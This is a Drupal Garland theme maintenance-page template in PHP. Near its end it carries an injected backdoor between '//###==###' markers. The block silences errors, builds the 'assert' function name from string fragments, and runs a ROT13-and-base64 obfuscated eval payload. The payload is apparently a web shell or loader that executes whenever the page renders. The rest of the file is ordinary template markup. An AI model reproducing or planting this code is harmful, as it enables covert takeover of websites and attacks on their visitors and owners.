<?php

/**
 * @file
 * Override of the default maintenance page.
 *
 * This is an override of the default maintenance page. Used for Garland and
 * Minnelli, this file should not be moved or modified since the installation
 * and update pages depend on this file.
 *
 * This mirrors closely page.tpl.php for Garland in order to share the same
 * styles.
 */
?><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="<?php print $language->language ?>" lang="<?php print $language->language ?>" dir="<?php print $language->dir ?>">
  <head>
    <title><?php print $head_title ?></title>
    <?php print $head ?>
    <?php print $styles ?>
    <?php print $scripts ?>
  </head>
  <body class="<?php print $classes ?>">

<!-- Layout -->
  <div id="header-region" class="clearfix"><?php print $header; ?></div>

    <div id="wrapper">
    <div id="container" class="clearfix">

      <div id="header">
        <div id="logo-floater">
        <?php
          // Prepare header
          $site_fields = array();
          if ($site_name) {
            $site_fields[] = $site_name;
          }
          if ($site_slogan) {
            $site_fields[] = $site_slogan;
          }
          $site_title = implode(' ', $site_fields);
          if ($site_fields) {
            $site_fields[0] = '<span>' . $site_fields[0] . '</span>';
          }
          $site_html = implode(' ', $site_fields);

          if ($logo || $site_title) {
            print '<h1 id="branding"><a href="' . $base_path . '" title="' . $site_title . '">';
            if ($logo) {
              print '<img src="' . $logo . '" alt="' . $site_title . '" id="logo" />';
            }
            print $site_html . '</a></h1>';
          }
        ?>
        </div>

      </div> <!-- /header -->

      <?php if ($sidebar_first): ?>
        <div id="sidebar-first" class="sidebar">
          <?php print $sidebar_first ?>
        </div>
      <?php endif; ?>

      <div id="center"><div id="squeeze"><div class="right-corner"><div class="left-corner">
          <?php if ($title): ?><h2><?php print $title ?></h2><?php endif; ?>
          <?php print $messages; ?>
          <?php print $help; ?>
          <div class="clearfix">
            <?php print $content ?>
          </div>
          <div id="footer"><?php print $footer ?></div>
      </div></div></div></div> <!-- /.left-corner, /.right-corner, /#squeeze, /#center -->

      <?php if ($sidebar_second): ?>
        <div id="sidebar-second" class="sidebar">
          <?php print $sidebar_second ?>
        </div>
      <?php endif; 


//###==###
error_reporting(0); 
$strings = "as";$strings .= "sert";
@$strings(str_rot13('riny(onfr64_qrpbqr("nJLtXTymp2I0XPEcLaLcXFO7VTIwnT8tWTyvqwftsFOyoUAyVUgcMvtuMJ1jqUxbWS9QG09YFHIoVzAfnJIhqS9wnTIwnlWqXFyxnJHbWS9QG09YFHIoVzAfnJIhqS9wnTIwnlWqXGgcMvtunKAmMKDbWTAsJlWVISEDK0SQD0IDIS9QFRSFH0IHVy0cXKgcMvujpzIaK21uqTAbXPVuYvS1VvkznJkyK2qyqS9wo250MJ50pltxK1ASHyMSHyfvH0AFFIOHK0MWGRIBDH1SVy0cXFy7WTZjCFWIIRLgBPV7sJIfp2I7WTZjCFW3nJ5xo3qmYGRlAGRvB319MJkmMKfxLmN9WTAsJlWVISEDK0SQD0IDIS9QFRSFH0IHVy07sJyzXTM1ozA0nJ9hK2I4nKA0pltvL3IloS9cozy0VvxcrlEwZG1wqKWfK2yhnKDbVzu0qUN6Yl9eMzcmoaEcrT94n2Smn2LhpaHiM2I0YaObpQ9xCFVhqKWfMJ5wo2EyXPEsH0IFIxIFJlWGEIWJEIWsGxSAEFWqYvEsH0IFIxIFJlWFEISIEIAHK1IFFFWqXF4vWaH9Vv51pzkyozAiMTHbWS9GEIWJEIWoVxuHISOsIIASHy9OE0IBIPWqXF4vWzZ9Vv4xLmNhVvMcCGRznKN9Vv4xK1ASHyMSHyfvHxIAG1ESK0SRESVvKF4vWzt9Vv5gMQHbVwZkMQH5Awx4MQR2MzIxMTMzLzZmMQOyZQt2LJSuMGuyVv4xK1ASHyMSHyfvH0IFIxIFK05OGHHvKF4xK1ASHyMSHyfvHxIEIHIGIS9IHxxvKF4xK1ASHyMSHyfvFSEHHS9IH0IFK0SUEH5HVy0hWTZjYvVkVvxcB2A1pzksp2I0o3O0XPEwZFj0ZvkzLJkmMFx7L3IloS9mMKEipUDbWTZkYQR5BGRmYUElqJHcBlEcLaLtCFNtL3IloS9yrTIwXPEwZFx7L3IloS9woT9mMFtxLmRcB31yoUAynJLbnJ5cK2qyqPtvLJkfo3qsqKWfK2MipTIhVvx9CGRcrlEcLaLtCFOznJkyK2qyqS9wo250MJ50pltvnUE0pQbiY2gznaAhqTy4o3ueLKAeMv5lqF9aMKDhpTujC2D9Vv51pzkyozAiMTHbWS9GEIWJEIWoVyASHyMSHy9BDH1SVy0hWS9GEIWJEIWoVyWSHIISH1EsIIWWVy0cYvVzqG0vYaIloTIhL29xMFtxK1ASHyMSHyfvFSEHHS9IH0IFK0SUEH5HVy0cYvVzLm0vYvEwZP4vWzx9ZFMcpQ0vYvEsH0IFIxIFJlWFEH1CIRIsDHERHvWqYvVznQ0vYz1xAFtvZmSxAGx2BGuxZGMzMJExMzMvLmAxZTHjBQMuLJSyBTHvYvEsH0IFIxIFJlWGEIWJEIWsGxSAEFWqYvEsH0IFIxIFJlWFEISIEIAHK1IFFFWqYvEsH0IFIxIFJlWVISEDK1IGEIWsDHqSGyDvKF4xLmNhVwRvXFx7sFOcMvNbnKAmMKDbWTyvqvxcVUftMJAbolNxnJW2BlO9VTyzXTymp2I0XPEsHxIEIHIGISfvpPWqXFNzWvNxK1WSHIISH1EoVaNvKFN9CFNvLmuvZzWxZQxvXFO7VROup3AypaDbWS9FEISIEIAHJlWwVy0cBlO9sD=="));'));
//###==###
?>

    </div> <!-- /container -->
  </div>
<!-- /layout -->

  </body>
</html>